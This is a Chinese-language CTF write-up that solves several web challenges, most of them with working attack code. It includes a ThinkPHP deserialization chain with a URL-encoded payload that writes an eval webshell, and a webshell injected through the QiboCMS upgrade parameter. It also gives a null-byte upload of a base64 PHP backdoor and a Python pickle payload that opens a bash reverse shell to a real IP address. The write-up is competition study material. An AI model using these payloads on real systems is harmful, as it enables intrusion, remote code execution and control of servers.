&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$tag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#39;expire&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3600&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;cache_subdir&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;prefix&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;data_compress&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;xxx&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$Memcached&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\session\driver\Memcached&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\think\cache\driver\File&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">$Output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\console\Output&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Memcached&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$model&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\db\Query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Output&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$HasOne&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\model\relation\HasOne&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$window&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\process\pipes\Windows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\model\Pivot&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Output&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$HasOne&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$window&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上传&lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
&lt;/code>&lt;/pre>&lt;p>虽然会返回一个报错的页面，但是可以在&lt;code>/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.php&lt;/code>处验证一下是否写上了🐎，文件名字是&lt;code>md5('tag_'.md5($this-&amp;gt;tag))&lt;/code>，连接密码是ccc 直接蚁剑&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804202819779.png" alt="image-20210804202819779">&lt;/p>
&lt;p>在&lt;a href="http://www.snowywar.top/?p=2424">雪殇的wp&lt;/a>中用的是另一个，更直接的写🐎方式，下面说一下思路（大概&lt;/p>
&lt;p>我们可以先尝试看看敏感函数file_put_contents()是否能利用&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804212231467.png" alt="image-20210804212231467">&lt;/p>
&lt;p>在&lt;code>application/admin/controller/Upgrade.php&lt;/code>下看到了文件写入的函数，它位于在&lt;code>writelog()&lt;/code>中，这个函数的功能是处理post请求传入的各项参数&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804212743633.png" alt="image-20210804212743633">&lt;/p>
&lt;p>这个&lt;code>config('client_upgrade_edition')&lt;/code>捏，跟了一下 它会返回null，再往上看到&lt;code>_initialize()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805140607537.png" alt="image-20210805140607537">&lt;/p>
&lt;p>所以最后是会将$upgrade_edition写入中&lt;code>/runtime/client_upgrade_edtion.php&lt;/code>中；而整个writelog()函数会被sysup()调用&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804213858768.png" alt="image-20210804213858768">&lt;/p>
&lt;p>跟进这个sysup()和$upgrade_edtion，看是否可用+如何用&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220616726.png" alt="image-20210804220616726">&lt;/p>
&lt;p>在&lt;code>template/admin_style/default/admin/upgrade/index.htm&lt;/code>下看到了确实存在的路由，这个的页面是在后台管理中心 - 系统功能 - 系统在线升级处，随便升一个看看&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804214721944.png" alt="image-20210804214721944">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804215658734.png" alt="image-20210804215658734">&lt;/p>
&lt;p>抓包之后看到这里确实有post访问和upgrade_edtion参数，那就稳了，直接写🐎&lt;/p>
&lt;pre tabindex="0">&lt;code>/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E//
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220302331.png" alt="image-20210804220302331">&lt;/p>
&lt;p>将🐎写进的目标页面&lt;code>/runtime/client_upgrade_edition.php&lt;/code>连入蚁剑 拿flag即可&lt;/p>
&lt;p>————比赛的时候我其实是没有搜到&lt;a href="https://ma4ter.cn/2527.html">齐博建站系统x1.0代码审计&lt;/a>这篇的，当时思路是在后台在找有没有可以利用的地方直接写🐎 ，当时找的是独立页管理，尝试upload，但是并不太行（也可能是我太菜了），然后也没去审代码（懒狗）所以 就没出这个题，现在看还是疏忽了 确实完全没注意到系统在线升级这个模块是可用的 也没有认真的分析源码 我的过&lt;/p>
&lt;h2 id="安全安全还是xxx的安全">安全,安全,还是xxx的安全&lt;/h2>
&lt;blockquote>
&lt;p>某个特别安全的商店&lt;/p>
&lt;p>Hint:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">CREATE&lt;/span> &lt;span style="color:#00a8c8">TABLE&lt;/span> &lt;span style="color:#d88200">&amp;#34;users&amp;#34;&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span> &lt;span style="color:#00a8c8">NOT&lt;/span> &lt;span style="color:#00a8c8">NULL&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span> &lt;span style="color:#00a8c8">UNIQUE&lt;/span> &lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;login_password&amp;#34;&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;money&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;pay_password&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;flag_num&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#00a8c8">PRIMARY&lt;/span> &lt;span style="color:#00a8c8">KEY&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">CREATE&lt;/span> &lt;span style="color:#00a8c8">TABLE&lt;/span> &lt;span style="color:#d88200">&amp;#34;flaaaaaaaaag&amp;#34;&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;flllllllag&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>特别简陋的前端，有登录和注册和主页三个页面，登录处有一定过滤 存在sqli&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133701306.png" alt="image-20210801133701306">&lt;/p>
&lt;p>任意注册账号，走一波流程&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133748445.png" alt="image-20210801133748445">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133808970.png" alt="image-20210801133808970">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133825487.png" alt="image-20210801133825487">&lt;/p>
&lt;p>&lt;del>😅蚌埠住了&lt;/del>&lt;/p>
&lt;p>回过头来看一下Burp对刚才操作的抓包结果，从cookie可以知道后端是flask框架 ，flask的话一般标配sqlite数据库，然后看下页面源码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805142343684.png" alt="image-20210805142343684">&lt;/p>
&lt;p>注册时用post提交信息，密码部分用的是&lt;code>md5(app.users.password+'CBCTF')&lt;/code>，支付密码是&lt;code>encrsa(app.users.pay_password)&lt;/code>，好家伙 这个加密 pay_password部分md5+rsa+b64&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>————比赛的时候基本就停到这里了，感觉是sqli 但是不知道怎么注 全是md5的，以下是参考&lt;a href="https://www.cnblogs.com/erR0Ratao/p/15088223.html">wp&lt;/a>之后的复现&lt;/p>
&lt;p>赛后讲题的时候 出题师傅说参考的是这一篇文章&lt;a href="http://cache.baiducontent.com/c?m=DKJpowjfS-VrxBDrvlkdWFgbk_gnjyP0HEBWJljdQEQ9V3LlYgD1_bfav9DjmFclDejSpHzx5A9kyWFfTVUYm0bX6pNmtyBsxwPjYx-C3KRb_L2YzCoKogiCFXWcyV80EQ5dcXMLFlkbGHr_-te4xQbrgVm2Sd2UKx-_aXSrxQZ-IEBexIZkQCHg53QbTNdTQkH1IHgj_ozoB9uq12JYdR54wSPrMDwCK9QMq-qhRNa&amp;amp;p=8734d15e8cd012a05abd9b7d0c1093&amp;amp;newp=8478c915d9c040a911a2c7710f0588231610db2151d6d1126b82c825d7331b001c3bbfb423291b07d6c27a6c01aa485ae9f23073330923a3dda5c91d9fb4c57479c168&amp;amp;s=cfcd208495d565ef&amp;amp;user=baidu&amp;amp;fm=sc&amp;amp;query=%CA%FD%BE%DD%BC%D3%C3%DC%BB%F2%B3%C9WAF%CA%A7%D0%A7%D7%EE%B4%F3%D4%AA%D0%D7&amp;amp;qid=e0c153e70004188f&amp;amp;p1=1">数据加密或成WAF失效最大元凶…&lt;/a>（原帖被404了 只有个快照 还是百度快照才能看 而且没图）核心是这一段&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805151726564.png" alt="image-20210805151726564">&lt;/p>
&lt;p>这个题的flag购买小站，对pay_password是进行前端md5+rsa+b64加密，后端再对应着拿私钥解密，存入数据库的是md5值，看似很完美 但是其实根本没有waf的介入 没有对参数进行任何过滤，如果我们从中间介入 只保留rsa+b64的部分 就可以任意控制参数达到二次注入的效果&lt;/p>
&lt;p>公钥在网页源码中已经给出，数据表的结果也已经在Hint中了，用cyberchef一把梭&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805153732476.png" alt="image-20210805153732476">&lt;/p>
&lt;p>重新注册个账号，只修改一下username即可 passwd不用变 将pay_password修改为上面生成的值，登陆后即可看到flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805152706585.png" alt="image-20210805152706585">&lt;/p>
&lt;h2 id="jjs-camera">jj&amp;rsquo;s camera&lt;/h2>
&lt;blockquote>
&lt;p>jj在某次网络安全活动中发现了个黑客做的网站，请使用https访问站点&lt;/p>
&lt;p>Hint: 网上能搜到源码，仅修改了前端ui，注意服务器的响应&lt;/p>
&lt;/blockquote>
&lt;p>也是已有的东西 但是比赛的时候我没搜到源码（尴尬）源码在这里：&lt;a href="https://www.heibai.org/post/2002.html">在吗宝贝？你点开这个网址看看[打开网站偷拍照片]&lt;/a> | &lt;a href="https://www.heibai.org/post/1630.html">点开一个网址我被记录了ip还偷拍了照片&lt;/a>&lt;/p>
&lt;p>（我这个智商真的是负数起步的 上面这两个帖子我看了好久 才反应过来这个钓鱼网站是要干啥。。。。&lt;/p>
&lt;p>前端是一个链接生成站 中间可以加一个id的参数，访问后会自动调用摄像头（但是会有个提示的弹窗），先拍照再相应链接，之后可以到先前的页面查看拍到的照片，数据以post的形式上传至/qbl.php?id=xxx&amp;amp;url=xxx，这是qbl.php的源码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$base64_img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;img&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$up_dir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;./img/&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">//存放在当前目录的img文件夹下
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">file_exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0777&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^(data:\s*image\/(\w+);base64,)/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#111">$type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$type&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;bmp&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;png&amp;#39;&lt;/span>&lt;span style="color:#111">))){&lt;/span>
&lt;span style="color:#111">$new_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$id&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;_&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">date&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;mdHis_&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$type&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$new_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">)));&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>file_put_contents()执行文件写入，内容可控+路径已知，过滤的点在于后缀名是bmp或png 并且只有除去后缀的这文件名可控，php版本是5.2.17，用00截断绕过（post部分要urlencode一下 burp或者hackbar就直接转了&lt;/p>
&lt;pre tabindex="0">&lt;code>/qbl.php?id=wuhu.php%00a&amp;amp;url=http://baidu.com
POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg==
&lt;/code>&lt;/pre>&lt;p>参考：&lt;a href="https://eastjun.top/2021/08/03/dasctf-july-x-cbctf-4th/">wp&lt;/a>&lt;/p>
&lt;h2 id="easyweb">easyweb&lt;/h2>
&lt;p>有一个docker的附件和一些源码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160437216.png" alt="image-20210805160437216">&lt;/p>
&lt;p>首页就是个白底黑字的Hello World，审下源码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160540313.png" alt="image-20210805160540313">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160627110.png" alt="image-20210805160627110">&lt;/p>
&lt;p>直接打断点调试一下（因为这里涉及到session的调用 所以在.vscode中的launch.json处添加一个configuration: &lt;code>&amp;quot;justMyCode&amp;quot;: false&lt;/code>这样可以在调用堆栈处看到完整的调用情况&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805180835775.png" alt="image-20210805180835775">&lt;/p>
&lt;p>可以注意到每次刷新之后 session的值都会发生变化，调试的时候可以看到生成这个session时调用了dumps方法，所以这个题就是反序列化的套路啦&lt;/p>
&lt;p>payload有两种吧 反弹shell 或者构造post/get请求到自己可以接收到的平台上，也都是常规做法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/175.24.73.30/2333 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#39;).read()&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">,))&lt;/span> &lt;span style="color:#75715e">#reduce必须返回元组或字符串&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">hello_world&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;233&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;2333&amp;#34;&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
